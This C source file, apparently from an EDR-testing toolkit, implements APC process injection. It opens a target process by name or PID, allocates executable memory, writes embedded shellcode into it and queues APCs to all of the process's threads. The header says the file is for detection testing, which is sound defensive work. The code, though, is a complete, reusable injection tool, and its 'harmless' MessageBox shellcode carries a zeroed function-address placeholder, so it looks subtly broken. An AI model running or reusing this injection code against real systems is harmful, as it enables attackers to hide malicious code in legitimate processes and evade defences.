/*
 * APC (Asynchronous Procedure Call) Injection
 * 
 * This technique injects shellcode using APC queue:
 * 1. Open target process
 * 2. Enumerate threads
 * 3. Allocate memory for shellcode
 * 4. Write shellcode to allocated memory
 * 5. Queue APC to thread(s)
 * 
 * For EDR testing purposes only.
 */

#include "../common/common.h"

// Sample shellcode (MessageBox "Hello from APC!")
// This is a harmless example for testing
unsigned char shellcode[] = 
    "\x48\x83\xEC\x28"                          // sub rsp, 0x28
    "\x48\x31\xC9"                              // xor rcx, rcx
    "\x48\x8D\x15\x0C\x00\x00\x00"              // lea rdx, [rip+12]
    "\x4D\x31\xC0"                              // xor r8, r8
    "\x4D\x31\xC9"                              // xor r9, r9
    "\xFF\x15\x12\x00\x00\x00"                  // call qword ptr [rip+18]
    "\x48\x83\xC4\x28"                          // add rsp, 0x28
    "\xC3"                                      // ret
    "APC Injection Test\0"
    "\x00\x00\x00\x00\x00\x00\x00\x00";         // MessageBoxA address placeholder

/**
 * Perform APC injection into a target process
 * 
 * @param pid Target process ID
 * @return TRUE on success, FALSE on failure
 */
BOOL InjectAPC(DWORD pid) {
    HANDLE hProcess = NULL;
    HANDLE hSnapshot = NULL;
    LPVOID pRemoteShellcode = NULL;
    BOOL success = FALSE;
    int apcQueued = 0;
    
    LOG_INFO("APC Injection Technique");
    LOG_INFO("Target PID: %d\n", pid);
    
    // Open target process
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    CHECK_HANDLE(hProcess, "Failed to open process");
    LOG_SUCCESS("Process handle obtained");
    
    // Verify permissions by attempting a small memory allocation
    LPVOID testAlloc = VirtualAllocEx(hProcess, NULL, 1, MEM_COMMIT, PAGE_READWRITE);
    if (testAlloc == NULL) {
        LOG_ERROR("Insufficient permissions for memory operations in target process");
        goto cleanup;
    }
    VirtualFreeEx(hProcess, testAlloc, 0, MEM_RELEASE);
    LOG_SUCCESS("Process permissions verified");
    
    // Allocate memory for shellcode
    pRemoteShellcode = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    CHECK_HANDLE(pRemoteShellcode, "Failed to allocate memory in target process");
    LOG_SUCCESS("Memory allocated at: 0x%p (%zu bytes)", pRemoteShellcode, sizeof(shellcode));
    
    // Write shellcode to allocated memory
    SIZE_T bytesWritten;
    CHECK_BOOL(
        WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytesWritten),
        "Failed to write shellcode to target process"
    );
    LOG_SUCCESS("Shellcode written (%zu bytes)", bytesWritten);
    
    // Enumerate threads in target process
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    CHECK_HANDLE(hSnapshot, "Failed to create thread snapshot");
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                // Open thread handle
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT,
                    FALSE,
                    te32.th32ThreadID
                );
                
                if (hThread != NULL) {
                    // Queue APC to thread
                    if (QueueUserAPC(
                        (PAPCFUNC)pRemoteShellcode,
                        hThread,
                        0
                    )) {
                        LOG_SUCCESS("APC queued to thread ID: %d", te32.th32ThreadID);
                        apcQueued++;
                    } else {
                        LOG_WARNING("Failed to queue APC to thread ID: %d", te32.th32ThreadID);
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    if (apcQueued > 0) {
        LOG_SUCCESS("Successfully queued APCs to %d thread(s)", apcQueued);
        LOG_INFO("Note: APC will execute when thread enters alertable state");
        success = TRUE;
    } else {
        LOG_ERROR("Failed to queue any APCs");
    }
    
cleanup:
    SAFE_CLOSE_HANDLE(hSnapshot);
    // Note: We don't free pRemoteShellcode as it needs to remain for APC execution
    SAFE_CLOSE_HANDLE(hProcess);
    
    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        PrintUsage(argv[0],
                   "<process_name_or_pid>",
                   "notepad.exe  or  1234");
        return 1;
    }
    
    DWORD pid;
    
    // Check if argument is numeric (PID) or process name
    char* endptr;
    pid = strtoul(argv[1], &endptr, 10);
    
    if (*endptr != '\0' || pid == 0) {
        // Not a valid number, treat as process name
        pid = GetProcessIdByName(argv[1]);
        if (pid == 0) {
            return 1;
        }
        LOG_SUCCESS("Found process with PID: %d\n", pid);
    }
    
    // Perform injection
    if (InjectAPC(pid)) {
        LOG_SUCCESS("APC injection completed");
        return 0;
    } else {
        LOG_ERROR("APC injection failed");
        return 1;
    }
}
